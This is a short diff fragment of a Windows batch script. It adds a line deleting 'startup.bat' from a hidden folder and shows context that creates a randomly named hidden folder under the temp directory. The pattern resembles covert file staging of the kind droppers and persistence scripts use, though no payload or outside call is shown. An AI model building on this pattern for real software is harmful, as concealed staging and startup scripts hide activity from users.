@@ -21,6 +21,8 @@ goto :eof
 
 :admin
 
+del %hiddenFolder1%\startup.bat
+
 REM Create hidden and random folder
 set "hiddenFolder2=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%" 
 mkdir "%hiddenFolder2%"
